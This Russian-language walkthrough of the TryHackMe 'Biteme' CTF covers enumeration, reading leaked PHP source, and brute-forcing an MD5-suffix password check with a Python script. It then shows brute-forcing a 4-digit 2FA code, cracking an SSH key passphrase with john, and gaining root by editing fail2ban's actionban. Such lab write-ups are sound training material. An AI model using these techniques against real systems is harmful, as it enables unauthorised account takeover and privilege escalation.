# Biteme

:white_check_mark:  [**Php highlighting**](#php)

:white_check_mark: [**Md5**](#md5)

:white_check_mark: [**Fail2ban**](#fail2ban)
___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV biteme.thm
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
|_  256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Сканируем директории командой:
```
gobuster dir -u http://biteme.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://biteme.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/17 19:18:42 Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 301) [Size: 310] [--> http://biteme.thm/console/]
```

Перейдем в директорию **/console**

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/1.png)

В коде страницы находим интересную функцию:
```
function handleSubmit() {
    eval(function (p, a, c, k, e, r) {
        e = function (c) {
            return c.toString(a)
        };
        if (!''.replace(/^/, String)) {
            while (c--) r[e(c)] = k[c] || e(c);
            k = [function (e) {
                return r[e]
            }];
            e = function () {
                return '\\w+'
            };
            c = 1
        };
        while (c--)
            if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
        return p
    }('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');', 20, 20, 'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'), 0, {}))
    return true;
```

(Был исползован [deobfuscate js](https://lelinhtinh.github.io/de4js/) для придания более читаемого вида)

<a name="php"></a>

Нам оставили подсказку в виде **php file syntax highlighting**. Поискав в интеренете, находим [мануал](https://www.php.net/manual/ru/function.highlight-file.php). Стрыницы с подсветкой кода используют расширение **phps**.

Попробуем перейти в директорию **/console/index.phps**. В коде страницы находим следующее:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/2.png)

Мы видим еще один файл **functions.php**. Попробуем использовать расширение **phps**.

В коде элемента мы видим, как проверяются имя пользователя и пароль, а также использование файла **config.php**. 

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/3.png)

Перейдем в этот файл используя расширение **phps**. В коде элемента находим закодированное имя пользователя(username: jason_test_account).

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/4.png)

В файле **functions.phps**, также можно увидеть, как проверяется пароль пользователя. Код преобразует пароль в md5 хэш и сравнивает его последние 3 числа со значением '001'.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/3.png)

<a name="md5"></a>

## Coding
Напишем код на питоне, который преобразует все пароли из словаря rockyou.txt в хэш md5 и сравнит их со значением '001'.

```
import hashlib

file = open('/usr/share/wordlists/rockyou.txt', 'r')
file_read = file.read()


words = list(file_read.split())

for word in words:
	hash = hashlib.md5(word.encode('utf-8')).hexdigest()
	if hash[-3::] == '001':
		print(word)
		print(hash)
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/5.png)

Найденные пароли:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/6.png)

Используем данные и логинимся. Нас встречает панель двухфакторной верификации, требующая 4-ех значный код. 

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/7.png)

Используя Burp intruder, подберем значение кода.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/8.png)

## Getting shell

Получаем доступ к аккаунту. На странице мы видим два поля, позволяющие просматривать директории и читать файлы сервера.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/9.png)

Просмотрев директории пользователей, находим приватный ключ.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/10.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/11.png)

Копируем его к себе на машину. С помощью ssh2john находим кодовую фразу. 
```
chmod 600 id_rsa

/usr/share/john/ssh2john.py id_rsa > hash

john hash -w=/usr/share/wordlists/rockyou.txt
```

Подключаемся к машине с помощью ключа.

## Privilege escalation

Просмотрим права пользователя.
```
sudo -l
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/12.png)

Видим, что мы можем перейти в аккаунт fred без пароля:
```
sudo -u fred bash
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/13.png)

<a name="fail2ban"></a>

Просмотрим права Фреда.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/14.png)

У нас есть права перезапуска fail2ban. Используем **find**, для поиска fail2ban в системе.
```
find / -name fail2ban 2>/dev/null
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/15.png)

Находим в интернете статью с представленной [уязвимостью](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/). Изменим значение actionban:
```
actionban = cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Biteme/16.png)

Получаем флаг рута.
